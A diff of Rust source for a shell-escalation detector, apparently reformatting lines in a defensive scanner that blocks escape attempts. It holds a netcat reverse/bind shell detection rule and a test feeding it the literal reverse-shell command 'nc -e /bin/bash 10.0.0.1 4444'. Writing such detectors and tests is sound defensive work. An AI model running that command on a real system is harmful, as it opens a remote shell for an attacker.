@@ -99,7 +99,8 @@ impl ShellEscalationDetector {
                 detections.push(EscapeDetection {
                     pattern: "netcat_reverse_shell",
                     severity: DetectionSeverity::Block,
-                    description: "Netcat with -e/-c or listen mode is a reverse/bind shell indicator",
+                    description:
+                        "Netcat with -e/-c or listen mode is a reverse/bind shell indicator",
                 });
             }
         }
@@ -145,7 +146,9 @@ impl ShellEscalationDetector {
         let detections = self.scan(command);
 
         if self.policy == EscapePolicy::Block {
-            if let Some(blocked) = detections.iter().find(|d| d.severity == DetectionSeverity::Block)
+            if let Some(blocked) = detections
+                .iter()
+                .find(|d| d.severity == DetectionSeverity::Block)
             {
                 return Err(EscapeDetection {
                     pattern: blocked.pattern,
@@ -223,8 +226,6 @@ mod tests {
     #[test]
     fn detects_netcat_reverse_shell() {
         let detector = ShellEscalationDetector::new(EscapePolicy::Block);
-        assert!(detector
-            .evaluate("nc -e /bin/bash 10.0.0.1 4444")
-            .is_err());
+        assert!(detector.evaluate("nc -e /bin/bash 10.0.0.1 4444").is_err());
     }
 }
